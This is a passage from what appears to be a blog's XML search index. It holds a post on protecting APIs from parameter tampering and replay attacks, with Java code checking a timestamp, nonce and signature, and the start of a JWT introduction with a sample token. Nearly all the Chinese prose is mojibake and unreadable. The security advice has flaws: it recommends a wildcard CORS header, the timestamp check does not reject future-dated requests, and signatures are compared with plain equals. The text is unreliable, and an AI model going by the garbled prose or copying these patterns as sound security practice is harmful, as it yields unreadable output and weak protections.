¼æ´žæ°¸è¿œå­˜åœ¨ã€‚]]></content>
      <categories>
        <category>å®žéªŒ</category>
      </categories>
      <tags>
        <tag>å®žéªŒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[APIæŽ¥å£é˜²æ­¢å‚æ•°ç¯¡æ”¹å’Œé‡æ”¾æ”»å‡»]]></title>
    <url>%2Fef4382ec%2F</url>
    <content type="text"><![CDATA[APIé‡æ”¾æ”»å‡»ï¼ˆReplay Attacksï¼‰åˆç§°é‡æ’­æ”»å‡»ã€å›žæ”¾æ”»å‡»ã€‚ä»–çš„åŽŸç†å°±æ˜¯æŠŠä¹‹å‰çªƒå¬åˆ°çš„æ•°æ®åŽŸå°ä¸åŠ¨çš„é‡æ–°å‘é€ç»™æŽ¥æ”¶æ–¹ã€‚HTTPSå¹¶ä¸èƒ½é˜²æ­¢è¿™ç§æ”»å‡»ï¼Œè™½ç„¶ä¼ è¾“çš„æ•°æ®æ˜¯ç»è¿‡åŠ å¯†çš„ï¼Œçªƒå¬è€…æ— æ³•å¾—åˆ°æ•°æ®çš„å‡†ç¡®å®šä¹‰ï¼Œä½†æ˜¯å¯ä»¥ä»Žè¯·æ±‚çš„æŽ¥æ”¶æ–¹åœ°å€åˆ†æžå‡ºè¿™äº›æ•°æ®çš„ä½œç”¨ã€‚æ¯”å¦‚ç”¨æˆ·ç™»å½•è¯·æ±‚æ—¶æ”»å‡»è€…è™½ç„¶æ— æ³•çªƒå¬å¯†ç ï¼Œä½†æ˜¯å´å¯ä»¥æˆªå–åŠ å¯†åŽçš„å£ä»¤ç„¶åŽå°†å…¶é‡æ”¾ï¼Œä»Žè€Œåˆ©ç”¨è¿™ç§æ–¹å¼è¿›è¡Œæœ‰æ•ˆçš„æ”»å‡»ã€‚ æ‰€è°“é‡æ”¾æ”»å‡»å°±æ˜¯æ”»å‡»è€…å‘é€ä¸€ä¸ªç›®çš„ä¸»æœºå·²æŽ¥æ”¶è¿‡çš„åŒ…ï¼Œæ¥è¾¾åˆ°æ¬ºéª—ç³»ç»Ÿçš„ç›®çš„ï¼Œä¸»è¦ç”¨äºŽèº«ä»½è®¤è¯è¿‡ç¨‹ï¼Œé‡æ”¾æ”»å‡»æ˜¯è®¡ç®—æœºä¸–ç•Œé»‘å®¢å¸¸ç”¨çš„æ”»å‡»æ–¹å¼ä¹‹ä¸€ã€‚ ä¸€æ¬¡HTTPè¯·æ±‚ï¼Œä»Žè¯·æ±‚æ–¹åˆ°æŽ¥æ”¶æ–¹ä¸­é—´è¦ç»è¿‡å¾ˆå¤šä¸ªè·¯ç”±å™¨å’Œäº¤æ¢æœºï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸­é€”æˆªèŽ·è¯·æ±‚çš„æ•°æ®ã€‚å‡è®¾åœ¨ä¸€ä¸ªç½‘ä¸Šå­˜æ¬¾ç³»ç»Ÿä¸­ï¼Œä¸€æ¡æ¶ˆæ¯è¡¨ç¤ºç”¨æˆ·æ”¯å–äº†ä¸€ç¬”å­˜æ¬¾ï¼Œæ”»å‡»è€…å®Œå…¨å¯ä»¥å¤šæ¬¡å‘é€è¿™æ¡æ¶ˆæ¯è€Œå·çªƒå­˜æ¬¾ã€‚ é‡æ”¾æ˜¯äºŒæ¬¡è¯·æ±‚ï¼Œå¦‚æžœAPIæŽ¥å£æ²¡æœ‰åšå¯¹åº”çš„å®‰å…¨é˜²æŠ¤ï¼Œå°†å¯èƒ½é€ æˆå¾ˆä¸¥é‡çš„åŽæžœã€‚ APIæŽ¥å£å¸¸è§çš„å®‰å…¨é˜²æŠ¤è¦åšçš„ä¸»è¦æœ‰å¦‚ä¸‹å‡ ç‚¹ï¼š é˜²æ­¢sqlæ³¨å…¥ é˜²æ­¢xssæ”»å‡» é˜²æ­¢è¯·æ±‚å‚æ•°è¢«ä¸²æ”¹ é˜²æ­¢é‡æ”¾æ”»å‡» ä¸»è¦é˜²å¾¡æŽªæ–½å¯ä»¥å½’çº³ä¸ºä¸¤ç‚¹ï¼š å¯¹è¯·æ±‚çš„åˆæ³•æ€§è¿›è¡Œæ ¡éªŒ å¯¹è¯·æ±‚çš„æ•°æ®è¿›è¡Œæ ¡éªŒ é˜²æ­¢é‡æ”¾æ”»å‡»å¿…é¡»è¦ä¿è¯è¯·æ±‚ä»…ä¸€æ¬¡æœ‰æ•ˆéœ€è¦é€šè¿‡åœ¨è¯·æ±‚ä½“ä¸­æºå¸¦å½“å‰è¯·æ±‚çš„å”¯ä¸€æ ‡è¯†ï¼Œå¹¶ä¸”è¿›è¡Œç­¾åé˜²æ­¢è¢«ç¯¡æ”¹ã€‚æ‰€ä»¥é˜²æ­¢é‡æ”¾æ”»å‡»éœ€è¦å»ºç«‹åœ¨é˜²æ­¢ç­¾åè¢«ä¸²æ”¹çš„åŸºç¡€ä¹‹ä¸Šã€‚ è¯·æ±‚å‚æ•°é˜²ç¯¡æ”¹é‡‡ç”¨httpsåè®®å¯ä»¥å°†ä¼ è¾“çš„æ˜Žæ–‡è¿›è¡ŒåŠ å¯†ï¼Œä½†æ˜¯é»‘å®¢ä»ç„¶å¯ä»¥æˆªèŽ·ä¼ è¾“çš„æ•°æ®åŒ…ï¼Œè¿›ä¸€æ­¥ä¼ªé€ è¯·æ±‚è¿›è¡Œé‡æ”¾æ”»å‡»ã€‚å¦‚æžœé»‘å®¢ä½¿ç”¨ç‰¹æ®Šæ‰‹æ®µè®©è¯·æ±‚æ–¹è®¾å¤‡ä½¿ç”¨äº†ä¼ªé€ çš„è¯ä¹¦è¿›è¡Œé€šä¿¡ï¼Œé‚£ä¹ˆhttpsåŠ å¯†çš„å†…å®¹ä¹Ÿå°†ä¼šè¢«è§£å¯†ã€‚åœ¨APIæŽ¥å£ä¸­æˆ‘ä»¬é™¤äº†ä½¿ç”¨httpsåè®®è¿›è¡Œé€šä¿¡å¤–ï¼Œè¿˜éœ€è¦æœ‰è‡ªå·±çš„ä¸€å¥—åŠ è§£å¯†æœºåˆ¶ï¼Œå¯¹è¯·æ±‚å‚æ•°è¿›è¡Œä¿æŠ¤ï¼Œé˜²æ­¢è¢«ç¯¡æ”¹ã€‚è¿‡ç¨‹å¦‚ä¸‹ï¼š å®¢æˆ·ç«¯ä½¿ç”¨çº¦å®šå¥½çš„ç§˜é’¥å¯¹ä¼ è¾“å‚æ•°è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°ç­¾åå€¼signatureï¼Œå¹¶ä¸”å°†ç­¾åå€¼ä¹Ÿæ”¾å…¥è¯·æ±‚å‚æ•°ä¸­ï¼Œå‘é€è¯·æ±‚ç»™æœåŠ¡ç«¯ æœåŠ¡ç«¯æŽ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç„¶åŽä½¿ç”¨çº¦å®šå¥½çš„ç§˜é’¥å¯¹è¯·æ±‚çš„å‚æ•°ï¼ˆé™¤äº†signatureä»¥å¤–ï¼‰å†æ¬¡è¿›è¡Œç­¾åï¼Œå¾—åˆ°ç­¾åå€¼autographã€‚ æœåŠ¡ç«¯å¯¹æ¯”signatureå’Œautographçš„å€¼ï¼Œå¦‚æžœå¯¹æ¯”ä¸€è‡´ï¼Œè®¤å®šä¸ºåˆæ³•è¯·æ±‚ã€‚å¦‚æžœå¯¹æ¯”ä¸ä¸€è‡´ï¼Œè¯´æ˜Žå‚æ•°è¢«ç¯¡æ”¹ï¼Œè®¤å®šä¸ºéžæ³•è¯·æ±‚ã€‚ å› ä¸ºé»‘å®¢ä¸çŸ¥é“ç­¾åçš„ç§˜é’¥ï¼Œæ‰€ä»¥å³ä½¿æˆªå–åˆ°è¯·æ±‚æ•°æ®ï¼Œå¯¹è¯·æ±‚å‚æ•°è¿›è¡Œç¯¡æ”¹ï¼Œä½†æ˜¯å´æ— æ³•å¯¹å‚æ•°è¿›è¡Œç­¾åï¼Œæ— æ³•å¾—åˆ°ä¿®æ”¹åŽå‚æ•°çš„ç­¾åå€¼signatureã€‚ç­¾åçš„ç§˜é’¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¾ˆå¤šæ–¹æ¡ˆï¼Œå¯ä»¥é‡‡ç”¨å¯¹ç§°åŠ å¯†æˆ–è€…éžå¯¹ç§°åŠ å¯†ã€‚ é˜²æ­¢é‡æ”¾æ”»å‡»åŸºäºŽtimestampçš„æ–¹æ¡ˆæ¯æ¬¡HTTPè¯·æ±‚ï¼Œéƒ½éœ€è¦åŠ ä¸Štimestampå‚æ•°ï¼Œç„¶åŽæŠŠtimestampå’Œå…¶ä»–å‚æ•°ä¸€èµ·è¿›è¡Œæ•°å­—ç­¾åã€‚å› ä¸ºä¸€æ¬¡æ­£å¸¸çš„HTTPè¯·æ±‚ï¼Œä»Žå‘å‡ºåˆ°è¾¾æœåŠ¡å™¨ä¸€èˆ¬éƒ½ä¸ä¼šè¶…è¿‡60sï¼Œæ‰€ä»¥æœåŠ¡å™¨æ”¶åˆ°HTTPè¯·æ±‚ä¹‹åŽï¼Œé¦–å…ˆåˆ¤æ–­æ—¶é—´æˆ³å‚æ•°ä¸Žå½“å‰æ—¶é—´ç›¸æ¯”è¾ƒï¼Œæ˜¯å¦è¶…è¿‡äº†60sï¼Œå¦‚æžœè¶…è¿‡äº†åˆ™è®¤ä¸ºæ˜¯éžæ³•çš„è¯·æ±‚ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œé»‘å®¢ä»ŽæŠ“åŒ…é‡æ”¾è¯·æ±‚è€—æ—¶è¿œè¿œè¶…è¿‡äº†60sï¼Œæ‰€ä»¥æ­¤æ—¶è¯·æ±‚ä¸­çš„timestampå‚æ•°å·²ç»å¤±æ•ˆäº†ã€‚å¦‚æžœé»‘å®¢ä¿®æ”¹timestampå‚æ•°ä¸ºå½“å‰çš„æ—¶é—´æˆ³ï¼Œåˆ™signatureå‚æ•°å¯¹åº”çš„æ•°å­—ç­¾åå°±ä¼šå¤±æ•ˆï¼Œå› ä¸ºé»‘å®¢ä¸çŸ¥é“ç­¾åç§˜é’¥ï¼Œæ²¡æœ‰åŠžæ³•ç”Ÿæˆæ–°çš„æ•°å­—ç­¾åã€‚ ä½†è¿™ç§æ–¹å¼çš„æ¼æ´žä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œå¦‚æžœåœ¨60sä¹‹åŽè¿›è¡Œé‡æ”¾æ”»å‡»ï¼Œé‚£å°±æ²¡åŠžæ³•äº†ï¼Œæ‰€ä»¥è¿™ç§æ–¹å¼ä¸èƒ½ä¿è¯è¯·æ±‚ä»…ä¸€æ¬¡æœ‰æ•ˆã€‚ åŸºäºŽnonceçš„æ–¹æ¡ˆnonceçš„æ„æ€æ˜¯ä»…ä¸€æ¬¡æœ‰æ•ˆçš„éšæœºå­—ç¬¦ä¸²ï¼Œè¦æ±‚æ¯æ¬¡è¯·æ±‚æ—¶ï¼Œè¯¥å‚æ•°è¦ä¿è¯ä¸åŒï¼Œæ‰€ä»¥è¯¥å‚æ•°ä¸€èˆ¬ä¸Žæ—¶é—´æˆ³æœ‰å…³ï¼Œæˆ‘ä»¬è¿™é‡Œä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œç›´æŽ¥ä½¿ç”¨æ—¶é—´æˆ³çš„16è¿›åˆ¶ï¼Œå®žé™…ä½¿ç”¨æ—¶å¯ä»¥åŠ ä¸Šå®¢æˆ·ç«¯çš„ipåœ°å€ï¼Œmacåœ°å€ç­‰ä¿¡æ¯åšä¸ªå“ˆå¸Œä¹‹åŽï¼Œä½œä¸ºnonceå‚æ•°ã€‚æˆ‘ä»¬å°†æ¯æ¬¡è¯·æ±‚çš„nonceå‚æ•°å­˜å‚¨åˆ°ä¸€ä¸ªâ€œé›†åˆâ€ä¸­ï¼Œå¯ä»¥jsonæ ¼å¼å­˜å‚¨åˆ°æ•°æ®åº“æˆ–ç¼“å­˜ä¸­ã€‚æ¯æ¬¡å¤„ç†HTTPè¯·æ±‚æ—¶ï¼Œé¦–å…ˆåˆ¤æ–­è¯¥è¯·æ±‚çš„nonceå‚æ•°æ˜¯å¦åœ¨è¯¥â€œé›†åˆâ€ä¸­ï¼Œå¦‚æžœå­˜åœ¨åˆ™è®¤ä¸ºæ˜¯éžæ³•è¯·æ±‚ã€‚ nonceå‚æ•°åœ¨é¦–æ¬¡è¯·æ±‚æ—¶ï¼Œå·²ç»è¢«å­˜å‚¨åˆ°äº†æœåŠ¡å™¨ä¸Šçš„â€œé›†åˆâ€ä¸­ï¼Œå†æ¬¡å‘é€è¯·æ±‚ä¼šè¢«è¯†åˆ«å¹¶æ‹’ç»ã€‚nonceå‚æ•°ä½œä¸ºæ•°å­—ç­¾åçš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯æ— æ³•ç¯¡æ”¹çš„ï¼Œå› ä¸ºé»‘å®¢ä¸æ¸…æ¥štokenï¼Œæ‰€ä»¥ä¸èƒ½ç”Ÿæˆæ–°çš„signã€‚ è¿™ç§æ–¹å¼ä¹Ÿæœ‰å¾ˆå¤§çš„é—®é¢˜ï¼Œé‚£å°±æ˜¯å­˜å‚¨nonceå‚æ•°çš„â€œé›†åˆâ€ä¼šè¶Šæ¥è¶Šå¤§ï¼ŒéªŒè¯nonceæ˜¯å¦å­˜åœ¨â€œé›†åˆâ€ä¸­çš„è€—æ—¶ä¼šè¶Šæ¥è¶Šé•¿ã€‚æˆ‘ä»¬ä¸èƒ½è®©nonceâ€œé›†åˆâ€æ— é™å¤§ï¼Œæ‰€ä»¥éœ€è¦å®šæœŸæ¸…ç†è¯¥â€œé›†åˆâ€ï¼Œä½†æ˜¯ä¸€æ—¦è¯¥â€œé›†åˆâ€è¢«æ¸…ç†ï¼Œæˆ‘ä»¬å°±æ— æ³•éªŒè¯è¢«æ¸…ç†äº†çš„nonceå‚æ•°äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡è®¾è¯¥â€œé›†åˆâ€å¹³å‡1å¤©æ¸…ç†ä¸€æ¬¡çš„è¯ï¼Œæˆ‘ä»¬æŠ“å–åˆ°çš„è¯¥urlï¼Œè™½ç„¶å½“æ—¶æ— æ³•è¿›è¡Œé‡æ”¾æ”»å‡»ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥æ¯éš”ä¸€å¤©è¿›è¡Œä¸€æ¬¡é‡æ”¾æ”»å‡»çš„ã€‚è€Œä¸”å­˜å‚¨24å°æ—¶å†…ï¼Œæ‰€æœ‰è¯·æ±‚çš„â€œnonceâ€å‚æ•°ï¼Œä¹Ÿæ˜¯ä¸€ç¬”ä¸å°çš„å¼€é”€ã€‚ åŸºäºŽtimestampå’Œnonceçš„æ–¹æ¡ˆnonceçš„ä¸€æ¬¡æ€§å¯ä»¥è§£å†³timestampå‚æ•°60sçš„é—®é¢˜ï¼Œtimestampå¯ä»¥è§£å†³nonceå‚æ•°â€œé›†åˆâ€è¶Šæ¥è¶Šå¤§çš„é—®é¢˜ã€‚é˜²æ­¢é‡æ”¾æ”»å‡»ä¸€èˆ¬å’Œé˜²æ­¢è¯·æ±‚å‚æ•°è¢«ä¸²æ”¹ä¸€èµ·åšï¼Œè¯·æ±‚çš„Headersæ•°æ®å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ æˆ‘ä»¬åœ¨timestampæ–¹æ¡ˆçš„åŸºç¡€ä¸Šï¼ŒåŠ ä¸Šnonceå‚æ•°ï¼Œå› ä¸ºtimstampå‚æ•°å¯¹äºŽè¶…è¿‡60sçš„è¯·æ±‚ï¼Œéƒ½è®¤ä¸ºéžæ³•è¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å­˜å‚¨60sçš„nonceå‚æ•°çš„â€œé›†åˆâ€å³å¯ã€‚APIæŽ¥å£éªŒè¯æµç¨‹ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// èŽ·å–tokenString token = request.getHeader("token");// èŽ·å–æ—¶é—´æˆ³String timestamp = request.getHeader("timestamp");// èŽ·å–éšæœºå­—ç¬¦ä¸²String nonceStr = request.getHeader("nonceStr");// èŽ·å–è¯·æ±‚åœ°å€String url = request.getHeader("url");// èŽ·å–ç­¾åString signature = request.getHeader("signature");// åˆ¤æ–­å‚æ•°æ˜¯å¦ä¸ºç©ºif (StringUtils.isBlank(token) || StringUtils.isBlank(timestamp) || StringUtils.isBlank(nonceStr) || StringUtils.isBlank(url) || StringUtils.isBlank(signature)) &#123; //éžæ³•è¯·æ±‚ return;&#125;//éªŒè¯tokenæœ‰æ•ˆæ€§ï¼Œå¾—åˆ°ç”¨æˆ·ä¿¡æ¯UserTokenInfo userTokenInfo = TokenUtils.getUserTokenInfo(token);if (userTokenInfo == null) &#123; //tokenè®¤è¯å¤±è´¥ï¼ˆé˜²æ­¢tokenä¼ªé€ ï¼‰ return;&#125;// åˆ¤æ–­è¯·æ±‚çš„urlå‚æ•°æ˜¯å¦æ­£ç¡®if (!request.getRequestURI().equals(url))&#123; //éžæ³•è¯·æ±‚ (é˜²æ­¢è·¨åŸŸæ”»å‡») return;&#125;// åˆ¤æ–­æ—¶é—´æ˜¯å¦å¤§äºŽ60ç§’if(DateUtils.getSecond()-DateUtils.toSecond(timestamp)&gt;60)&#123; //è¯·æ±‚è¶…æ—¶(é˜²æ­¢é‡æ”¾æ”»å‡») return;&#125;// åˆ¤æ–­è¯¥ç”¨æˆ·çš„nonceStrå‚æ•°æ˜¯å¦å·²ç»åœ¨redisä¸­if (RedisUtils.haveNonceStr(userTokenInfo,nonceStr))&#123; //è¯·æ±‚ä»…ä¸€æ¬¡æœ‰æ•ˆï¼ˆé˜²æ­¢çŸ­æ—¶é—´å†…çš„é‡æ”¾æ”»å‡»ï¼‰ return;&#125;// å¯¹è¯·æ±‚å¤´å‚æ•°è¿›è¡Œç­¾åString stringB = SignUtil.signature(token, timestamp, nonceStr, url,request);// å¦‚æžœç­¾åéªŒè¯ä¸é€šè¿‡if (!signature.equals(stringB)) &#123; //éžæ³•è¯·æ±‚ï¼ˆé˜²æ­¢è¯·æ±‚å‚æ•°è¢«ç¯¡æ”¹ï¼‰ return;&#125;// å°†æœ¬æ¬¡ç”¨æˆ·è¯·æ±‚çš„nonceStrå‚æ•°å­˜åˆ°redisä¸­è®¾ç½®60ç§’åŽè‡ªåŠ¨åˆ é™¤RedisUtils.saveNonceStr(userTokenInfo,nonceStr,60);//å¼€å§‹å¤„ç†åˆæ³•çš„è¯·æ±‚ åŸºäºŽä»¥ä¸Šçš„æ–¹æ¡ˆå°±å¯ä»¥åšåˆ°é˜²æ­¢APIæŽ¥æ”¶çš„å‚æ•°è¢«ç¯¡æ”¹å’Œé˜²æ­¢APIè¯·æ±‚é‡æ”¾æ”»å‡»ã€‚]]></content>
      <categories>
        <category>åŽç«¯</category>
      </categories>
      <tags>
        <tag>åŽç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSON WEB TOKEN]]></title>
    <url>%2Fb2d6036c%2F</url>
    <content type="text"><![CDATA[Json web token (JWT) æ˜¯ä¸€ç§åŸºäºŽJSONçš„å¼€æ”¾æ ‡å‡†ã€‚ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨çŽ¯å¢ƒé—´ä¼ é€’å£°æ˜Žï¼Œè¯¥tokenè¢«è®¾è®¡ä¸ºç´§å‡‘ä¸”å®‰å…¨çš„ï¼Œç‰¹åˆ«é€‚ç”¨äºŽåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰åœºæ™¯ã€‚JWTçš„å£°æ˜Žä¸€èˆ¬è¢«ç”¨æ¥åœ¨èº«ä»½æä¾›è€…å’ŒæœåŠ¡æä¾›è€…é—´ä¼ é€’è¢«è®¤è¯çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œä»¥ä¾¿äºŽä»Žèµ„æºæœåŠ¡å™¨èŽ·å–èµ„æºï¼Œä¹Ÿå¯ä»¥å¢žåŠ ä¸€äº›é¢å¤–çš„å…¶å®ƒä¸šåŠ¡é€»è¾‘æ‰€å¿…é¡»çš„å£°æ˜Žä¿¡æ¯ï¼Œè¯¥tokenä¹Ÿå¯ç›´æŽ¥è¢«ç”¨äºŽèº«ä»½è®¤è¯ã€‚ 1.åŸºæœ¬æ¦‚å¿µ Tokenå’ŒSessionçš„åŒºåˆ« åŸºäºŽSessionçš„è®¤è¯httpåè®®æ˜¯ä¸€ç§æ— çŠ¶æ€åè®®ï¼Œç”¨æˆ·åœ¨ç™»å½•æ—¶å‘æœåŠ¡ç«¯æä¾›ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç”¨æˆ·è®¤è¯ï¼Œä¸‹ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œç”¨æˆ·è¿˜è¦å†ä¸€æ¬¡è¿›è¡Œç”¨æˆ·è®¤è¯æ‰è¡Œï¼Œå› ä¸ºhttpåè®®æ˜¯æ— çŠ¶æ€çš„ï¼ŒæœåŠ¡å™¨å¹¶ä¸çŸ¥é“æ˜¯å“ªä¸ªç”¨æˆ·å‘å‡ºçš„è¯·æ±‚ã€‚ä¸ºäº†è®©æœåŠ¡ç«¯èƒ½è¯†åˆ«æ˜¯å“ªä¸ªç”¨æˆ·å‘å‡ºçš„è¯·æ±‚ï¼ŒæœåŠ¡ç«¯éœ€è¦åœ¨ç”¨æˆ·ç™»å½•æ—¶å­˜å‚¨ä¸€ä»½ç”¨æˆ·ç™»å½•çš„ä¿¡æ¯ï¼Œè¯¥ä¿¡æ¯ç”±Sessionå€¼æ¥æ ‡è¯†ï¼ŒæœåŠ¡ç«¯ç”ŸæˆSessionåŽå°†SessionIdä½œä¸ºç™»å½•çš„å“åº”æ•°æ®ä¼ é€’ç»™æµè§ˆå™¨ï¼Œè®©æµè§ˆå™¨ä¿å­˜ä¸ºcookieï¼Œæ–¹ä¾¿ä¸‹æ¬¡è¯·æ±‚æ—¶å‘é€ç»™æœåŠ¡ç«¯ï¼Œè¿™æ ·æœåŠ¡å™¨å°±èƒ½è¯†åˆ«æ˜¯æ¥è‡ªå“ªä¸ªç”¨æˆ·çš„è¯·æ±‚äº†ã€‚ Sessionè®¤è¯æš´éœ²çš„é—®é¢˜ èµ„æºå¼€é”€ï¼šæ¯ä¸ªç”¨æˆ·è¿›è¡Œç™»å½•è®¤è¯ï¼ŒæœåŠ¡ç«¯åº”ç”¨åšä¸€æ¬¡è®°å½•ï¼Œæ–¹ä¾¿ç”¨æˆ·ä¸‹æ¬¡è¯·æ±‚çš„é‰´åˆ«ï¼Œä¸ºäº†èƒ½å¤Ÿå¿«é€Ÿå“åº”ç”¨æˆ·è¯·æ±‚ï¼Œé€šå¸¸éœ€è¦æŠŠsessionä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œéšç€è®¤è¯ç”¨æˆ·çš„å¢žåŠ ï¼ŒæœåŠ¡ç«¯çš„å¼€é”€ä¼šæ˜Žæ˜¾å¢žå¤§ã€‚ æ‰©å±•æ€§ï¼šç”¨æˆ·ç™»å½•è®¤è¯è®°å½•è¢«ä¿å­˜åœ¨å½“å‰æœåŠ¡ç«¯ä¸­ï¼Œæ„å‘³ç€ç”¨æˆ·ä¸‹æ¬¡è¯·æ±‚è¿˜å¿…é¡»è¦åœ¨è¿™å°æœåŠ¡å™¨ä¸Šæ‰èƒ½æ‹¿åˆ°æŽˆæƒçš„èµ„æºã€‚éšç€ç”¨æˆ·å¹¶å‘çš„å¢žå¤§ï¼Œwebåº”ç”¨å¦‚æžœè¦æ‰©å±•æˆåˆ†å¸ƒå¼åº”ç”¨ï¼Œé‡‡ç”¨sessionçš„è®¤è¯å°†ä¼šå˜å¾—å¾ˆéš¾æ‰©å±•ï¼Œè™½ç„¶å¯ä»¥ç”¨redisæ¥åšåˆ†å¸ƒå¼sessionå…±äº«ï¼Œä½†æ˜¯è¿˜æ˜¯å ç”¨äº†ç›¸å½“å¤§çš„å†…å­˜å¼€é”€ã€‚ CSRFï¼šå› ä¸ºæ˜¯åŸºäºŽcookieæ¥è¿›è¡Œç”¨æˆ·è¯†åˆ«çš„ï¼Œå¦‚æžœcookieè¢«æˆªèŽ·ï¼Œå°±ä¼šå¾ˆå®¹æ˜“å—åˆ°è·¨ç«™è¯·æ±‚ä¼ªé€ çš„æ”»å‡»ã€‚ åŸºäºŽTokençš„è®¤è¯åŸºäºŽtokençš„è®¤è¯ä¸éœ€è¦åœ¨æœåŠ¡ç«¯ä¿å­˜ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯æˆ–è€…ä¼šè¯ä¿¡æ¯ï¼Œè¯¥è®¤è¯æœºåˆ¶çš„åº”ç”¨ä¸éœ€è¦è€ƒè™‘ç”¨æˆ·åœ¨å“ªä¸€å°æœåŠ¡å™¨ç™»å½•ï¼Œä¸ºåº”ç”¨çš„æ‰©å±•æä¾›äº†ä¾¿åˆ©ã€‚ é‰´æƒæµç¨‹ å®¢æˆ·ç«¯ä½¿ç”¨ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç™»å½•è¯·æ±‚ æœåŠ¡ç«¯æŽ¥æ”¶ç”¨æˆ·çš„ç™»å½•è¯·æ±‚ï¼Œè¿›è¡Œç”¨æˆ·ä¿¡æ¯çš„è®¤è¯ æœåŠ¡ç«¯ä¸ºè®¤è¯é€šè¿‡çš„ç”¨æˆ·ç”Ÿæˆtokenï¼Œåœ¨ç™»å½•è¯·æ±‚çš„å“åº”ä½“é‡Œè¿”å›žç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯å­˜å‚¨ç™»å½•æ—¶çš„tokenï¼Œå¹¶åœ¨æ¯æ¬¡è¯·æ±‚æœåŠ¡ç«¯æ—¶é™„å¸¦ä¸Šå­˜å‚¨çš„token æœåŠ¡ç«¯éªŒè¯tokenå€¼å¹¶è¿”å›žæ•°æ®ã€‚ è¿™ä¸ªtokenå¿…é¡»è¦åœ¨æ¯æ¬¡è¯·æ±‚æ—¶ä¼ é€’ç»™æœåŠ¡ç«¯ï¼Œå®ƒåº”è¯¥ä¿å­˜åœ¨è¯·æ±‚å¤´é‡Œï¼Œ å¦å¤–ï¼ŒæœåŠ¡ç«¯è¦æ”¯æŒCORS(è·¨æ¥æºèµ„æºå…±äº«)ç­–ç•¥ï¼Œä¸€èˆ¬æˆ‘ä»¬åœ¨æœåŠ¡ç«¯è¿™ä¹ˆåšå°±å¯ä»¥äº†Access-Control-Allow-Origin: *ã€‚ 2. åŸºç¡€çŸ¥è¯†JWTé•¿ä»€ä¹ˆæ ·ï¼Ÿä»¥ä¸‹æ˜¯ä¸€æ®µJWTå­—ç¬¦ä¸²ç¤ºä¾‹1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImxhbnNoaXFpbiIsImFkbWluIjp0cnVlfQ.QzO3RdsVgG4MxikyFDXt55jIjnjAPF49vvPL_fUd_KQ JWTçš„ç»“æž„JWTç”±ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ HEADER:ï¼ˆå¤´éƒ¨ï¼Œç”Ÿæˆç®—æ³•å’Œtokenç±»åž‹ï¼Œç®—æ³•ä¸€èˆ¬æ˜¯ï¼Œtokenç±»åž‹è¿™é‡Œæ˜¯jwtï¼‰ PAYLOAD: (æœ‰æ•ˆè½½è·, è¿™é‡Œå­˜æ”¾ä¸€äº›è¦ä¼ è¾“çš„æ•°æ®) VERIFY SIGNATURE ï¼ˆç­¾åéªŒè¯ï¼‰ ä¸‰ä¸ªéƒ¨åˆ†ç”¨ç¬¦å· . è¿žæŽ¥èµ·æ¥ï¼Œæž„æˆäº†JWTå­—ç¬¦ä¸²ï¼Œæ ¼å¼å¦‚ä¸‹æ‰€ç¤º1xxxxx.yyyyy.zzzzz headerjwtçš„å¤´éƒ¨æ‰¿è½½ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼š å£°æ˜Žç±»åž‹ï¼Œè¿™é‡Œæ˜¯jwt å£°æ˜ŽåŠ å¯†çš„ç®—æ³• é€šå¸¸ç›´æŽ¥ä½¿ç”¨ HMAC SHA256å®Œæ•´çš„å¤´éƒ¨å°±åƒä¸‹é¢è¿™æ ·çš„JSONï¼š1234&#123; "alg": "HS256", "typ": "JWT"&#125; ç„¶åŽå°†å¤´éƒ¨è¿›è¡Œbase64åŠ å¯†ï¼ˆè¯¥åŠ å¯†æ˜¯å¯ä»¥å¯¹ç§°è§£å¯†çš„),æž„æˆäº†ç¬¬ä¸€éƒ¨åˆ†.1eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 playloadè½½è·å°±æ˜¯å­˜æ”¾æœ‰æ•ˆä¿¡æ¯çš„åœ°æ–¹ã€‚è¿™ä¸ªåå­—åƒæ˜¯ç‰¹æŒ‡é£žæœºä¸Šæ‰¿è½½çš„è´§å“ï¼Œè¿™äº›æœ‰æ•ˆä¿¡æ¯åŒ…å«ä¸‰ä¸ªéƒ¨åˆ† æ ‡å‡†ä¸­æ³¨å†Œçš„å£°æ˜Ž å…¬å…±çš„å£°æ˜Ž ç§æœ‰çš„å£°æ˜Žæ ‡å‡†ä¸­æ³¨å†Œçš„å£°æ˜Ž (å»ºè®®ä½†ä¸å¼ºåˆ¶ä½¿ç”¨) ï¼š iss: jwtç­¾å‘è€… sub: jwtæ‰€é¢å‘çš„ç”¨æˆ· aud: æŽ¥æ”¶jwtçš„ä¸€æ–¹ exp: jwtçš„è¿‡æœŸæ—¶é—´ï¼Œè¿™ä¸ªè¿‡æœŸæ—¶é—´å¿…é¡»è¦å¤§äºŽç­¾å‘æ—¶é—´ nbf: 